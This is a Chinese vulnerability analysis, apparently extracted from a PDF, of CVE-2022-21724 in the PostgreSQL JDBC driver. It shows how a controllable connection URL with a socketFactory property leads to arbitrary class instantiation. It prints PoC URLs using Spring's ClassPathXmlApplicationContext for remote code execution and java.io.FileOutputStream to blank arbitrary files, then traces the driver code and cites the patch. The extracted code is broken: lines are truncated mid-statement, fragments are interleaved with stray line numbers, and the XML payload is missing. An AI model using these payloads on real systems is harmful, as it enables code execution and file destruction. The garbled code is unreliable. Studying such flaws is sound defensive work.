Vul of PostpreSql、Informic JDBC Driver
当程序中JDBC 连接 URL 可控时，可能会造成安全问题。HITB2021SIN 中的分享议题 "Make 
JDBC Attacks Brilliant Again" 列举出了H2、IBM DB2、MODEShape、Apache Derby、
SQLite等数据库Driver，在Connect URL可控情况下的安全问题。
⼀、Postgresql CVE-2022-21724
近⽇披露了CVE-2022-21724，同样是在JDBC Connection URL可控情况下将会出现某些安
全问题。
当攻击者控制 jdbc url 或属性时，使⽤ postgresql 库的系统将受到攻击。pgjdbc 根据通过 
`authenticationPluginClassName`、`sslhostnameveriﬁer`、`socketFactory`、`sslfactory`、
`sslpasswordcallback` 连接属性提供的类名实例化插件实例。但是，驱动程序在实例化类之前
没有验证类是否实现了预期的接⼝。这可能导致通过任意类加载远程代码执⾏。
1.复现
Github提供POC如下：
可以看到是利⽤了Spring中的
org.springframework.context.support.ClassPathXmlApplicationContext类，这⾥搭建环境参
考Spring Boot Connect to PostgreSQL Database Examples
测试Demo
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.
package com.example.demo;
/**
 * @auther Skay
 * @date 2022/2/18 0:18
 * @description
 */
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.jdbc.core.BeanPropertyRowMapper;
import org.springframework.jdbc.core.JdbcTemplate;
import java.sql.Types;
import java.util.List;
import java.util.Map;
@SpringBootApplication
public class SpringJdbcTemplate2PostgreSqlApplication implements CommandLine
1
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
application.propertise
2.分析
简单看⼀下代码逻辑
org.postgresql.Driver#makeConnection
进⼊org.postgresql.jdbc.PgConnection类初始化逻辑
——> oorg.postgresql.jdbc.PgConnection#PgConnection
——> org.postgresql.core.ConnectionFactory#openConnection
——> org.postgresql.core.v3.ConnectionFactoryImpl#openConnectionImpl
这⾥会进⼊关键⽅法org.postgresql.core.SocketFactoryFactory#getSocketFactory
    @Autowired
    private JdbcTemplate jdbcTemplate;
    public static void main(String[] args) {
        SpringApplication.run(SpringJdbcTemplate2PostgreSqlApplication.class
    }
    @Override
    public void run(String... args) throws Exception {
        Map map = jdbcTemplate.queryForMap("select * from tb
        System.out.println(map.toString());
    }
}
spring.datasource.url=jdbc:postgresql://192.168.33.179:5432/test?socketFacto
spring.datasource.username=postgres
spring.datasource.password=postgresql
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
1
2
3
4
有⼀个if else逻辑，从Properties中获取socketFactoryClassName，如果为空则return默认的
javax.net.SocketFactory，否则进⼊org.postgresql.util.ObjectFactory#instantiate逻辑
进⼊org.postgresql.util.ObjectFactory#instantiate，会进⼊newInstance逻辑初始化
socketFactory参⼊传⼊的
org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg
类，且初始化参数也可⽤socketFactoryArg参数指定
最终落地到
org.springframework.context.support.ClassPathXmlApplicationContext#ClassPathXmlAppli
cationContext(java.lang.String)
org.springframework.context.support.ClassPathXmlApplicationContext这条链在JackSon反
序列化漏洞中使⽤过(CVE-2017-17485)
poc.xml 内容为
1
2
3
4
5
6
最终复现如下：
3.Other
按照这个思路，我们只需找到符合这样条件的⼀个类，public构造⽅法中有且只有⼀个String参
数，会造成⼀些敏感操作，这样找到了⼀个java.io.FileOutputStream，可以造成任意⽂件内容
置空
Poc如下：spring.datasource.url=jdbc:postgresql://192.168.33.179:5432/test?
socketFactory=java.io.FileOutputStream=D:\tmp\aaa.txt
4.补丁
https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c
813 添加了代码逻辑验证该类是否实现了预期的接⼝
⼆、参考链接：
https://su18.org/post/jdbc-connection-url-attack/
https://paper.seebug.org/1832/
https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4
7
8
9